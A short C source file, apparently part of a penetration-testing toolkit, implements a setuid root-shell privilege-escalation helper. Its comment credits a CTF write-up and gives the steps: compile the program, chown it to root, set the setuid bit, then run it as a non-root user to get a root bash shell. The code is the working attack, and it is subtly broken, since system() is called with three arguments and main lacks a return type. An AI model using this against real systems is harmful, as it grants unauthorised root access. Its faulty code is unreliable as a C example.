#include <unistd.h>

/**
 *   Credits to g0blin research: https://g0blin.co.uk/orcus-vulnhub-writeup/ 
 *   once I found a service running as root and open I googled how to privesc with C
 *   g0blin's writeup on the VM that spawned this toolkit came up, figured that would be a good example
 *   one distinction with this, it relies on being able to build a root executable program, this is done
 *   the example this was from involved a file share whose parent service was running as root, build/compile
 *   then chown root:root prog and chmod +s prog.  Once completed run the program as your shell'd non-root user
 *   and issue whoami.  As always use on systems you own for checking security or vulnerable machines/CTFs
 *   with permission.  It's your own fault of you use this for evil.
 **/

main(int argc, char ** argv, char ** envp)
{
    setgid(0);
    setuid(0);
    system("/bin/bash", argv, envp);
    return 0;
}